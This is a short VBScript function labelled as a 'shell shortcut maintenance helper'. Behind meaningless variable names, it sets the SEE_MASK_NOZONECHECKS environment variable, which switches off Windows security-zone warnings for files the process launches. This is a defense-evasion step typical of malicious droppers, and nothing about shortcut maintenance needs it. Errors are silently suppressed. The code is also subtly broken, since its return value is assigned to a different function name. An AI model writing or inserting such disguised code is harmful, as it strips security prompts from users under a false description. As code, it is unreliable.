' Shell shortcut maintenance helper
Function MergeProfileDelta70()
On Error Resume Next
  Dim strPolicyBlock69,strSegment95,blnValid41
  Set strPolicyBlock69=CreateObject("WScript.Shell")
  strSegment95=strPolicyBlock69.ExpandEnvironmentStrings("%TEMP%")
  blnValid41=strPolicyBlock69.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strSegment95)>0 And Len(blnValid41)>0 Then
    strPolicyBlock69.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ParseProfileBlock50=1
    Exit Function
  End If
  ParseProfileBlock50=0
End Function

